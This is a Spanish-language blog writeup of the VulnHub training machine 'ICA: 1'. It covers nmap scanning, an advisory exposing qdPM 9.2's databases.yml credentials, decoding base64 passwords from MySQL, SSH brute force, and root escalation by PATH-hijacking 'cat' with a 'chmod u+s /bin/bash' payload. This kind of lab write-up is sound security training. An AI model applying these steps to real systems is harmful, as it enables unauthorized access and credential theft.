---
layout: single
title: ICA 1 - VulnHub Writeup
excerpt: "Nuestro objetivo es descubrir de que se trata el proyecto secreto ICA."
date: 2022-10-27
classes: wide
header:
  teaser: /assets/images/ICA/logo.png
  teaser_home_page: true
categories:
  - Tecnicas
tags:
  - Pivoting
  - Bash
  - Herramientas
---

<p align="center">
<img src="/assets/images/ICA/logo.png" width="400">
</p>

# ICA: 1 Writeup by notlucken

## Reconocimiento de Servicios expuestos

Primero como siempre, tiro de nmap, con los argumentos ``nmap -p- --open -sS --min-rate 5000 -Pn -n 192.168.100.116`` y luego a los puertos abiertos les aplico un ``nmap -p22,80,3306,33060 -sCV 192.168.100.116``. Este es el resultado del segundo escaneo:

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.48 (Debian)
3306/tcp  open  mysql   MySQL 8.0.26
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 43
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Support41Auth, FoundRows, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: C-1\x037x\x0C&f\x7FBS6(nz\x1B6\x0D,
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
|_ssl-date: TLS randomness does not represent time
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
  31   │ |     Invalid message"
  32   │ |     HY000
  33   │ |   LDAPBindReq: 
  34   │ |     *Parse error unserializing protobuf message"
  35   │ |     HY000
  36   │ |   oracle-tns: 
  37   │ |     Invalid message-frame."
  38   │ |_    HY000
  39   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  40   │ SF-Port33060-TCP:V=7.92%I=7%D=10/27%Time=635B068E%P=x86_64-pc-linux-gnu%r(
  41   │ SF:NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b
  42   │ SF:\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPO
  43   │ SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0
  44   │ SF:b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVer
  45   │ SF:sionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,
  46   │ SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f
  47   │ SF:Invalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
  48   │ SF:)%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0
  49   │ SF:1\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCooki
  50   │ SF:e,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\
  51   │ SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
  52   │ SF:"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,
  53   │ SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05
  54   │ SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY
  55   │ SF:000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString
  56   │ SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x
  57   │ SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
  58   │ SF:\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01
  59   │ SF:\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20m
  60   │ SF:essage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LA
  61   │ SF:NDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0
  62   │ SF:\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesR
  63   │ SF:PC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
  64   │ SF:x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\
  65   │ SF:x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,
  66   │ SF:"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invali
  67   │ SF:d\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\
  68   │ SF:x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x1
  69   │ SF:0\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
  70   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  71   │ 
  72   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  73   │ # Nmap done at Thu Oct 27 19:30:46 2022 -- 1 IP address (1 host up) scanned in 14.48 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
![](/assets/images/ICA/Web.png)

Vemos que hay un Login Form de algo llamado qdPM. Hice un poco de busqueda en Internet y resulta ser un gestor de proyectos (un GitHub barato), y lo que me llamo la atencion es que dice su version ahi abajo, la 9.2

Decidi buscarla en SearchSploit a ver que salia, y:

```bash
❯ searchsploit qdpm 9.2
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                          | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                        | php/webapps/50176.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Password Exposure? Veamos que dice:

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 50176.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
   2   │ # Date: 03/08/2021
   3   │ # Exploit Author: Leon Trappett (thepcn3rd)
   4   │ # Vendor Homepage: https://qdpm.net/
   5   │ # Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
   6   │ # Version: 9.2
   7   │ # Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4
   8   │ 
   9   │ The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download
       │ .
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Raro. Vamos a probar como dice ahi, en ``http://192.168.100.116/core/config/databases.yml``

![](/assets/images/ICA/Descarga.png)

![](/assets/images/ICA/Contrasena.png)

Tenemos un user y password, probe por SSH, pero no se pudo. Como los puertos de MySQL estan abiertos, intentare conectarme por ahi para ver que hay:

![](/assets/images/ICA/mysql.png)

![](/assets/images/ICA/users.png)

![](/assets/images/ICA/passwds.png)

Las passwords estan en base64 , lo que podriamos hacer es hacer un ciclo for y mientras las vaya decodificando, las vaya guardando en un archivo que se llamara passwds:

## Ganando Acceso al Sistema

```bash
for passwd in WDdNUWtQM1cyOWZld0hkQw== c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==;do echo $passwd | base64 -d; echo; done | tee passwds

```

![](/assets/images/ICA/passwordsssh.png)


Bueno, como tenemos un listado de users & passwords, no se me ocurre otra cosa que hacer un ataque de fuerza bruta por ssh, ya que ese puerto esta abierto:

![](/assets/images/ICA/travis.png)

Tenemos la password de Travis. Ahora hay que ver la forma de escalar privilegios.

## Escalar Privilegios

Como ya tenemos acceso a la maquina, ahora solo nos queda escalar privilegios.

![](/assets/images/ICA/privEsc1.png)

Como Travis no puede ejecutar Sudo, me fije en los binarios SUID y uno particularmente me llamo la atencion, estoy hablando de ``/opt/get_access``

Como es un binario ejecutable, voy a tirar de ``strings /opt/get_access | less`` para poder listar los caracteres legibles

![](/assets/images/ICA/cat.png)

El binario esta ejecutando cat (no esta ejecutando ``/usr/bin/cat``) asi que como el que lo esta ejecuntando es root, podriamos hacer un PATH Hijacking de cat, para asignarnos permisos de Superusuario a la Bash

![](/assets/images/ICA/privEsc2.png)

Hicimos nuestro PATH Hijacking y con nuestro cat malicioso (``chmod u+s /bin/bash``) logramos escalar privilegios correctamente!




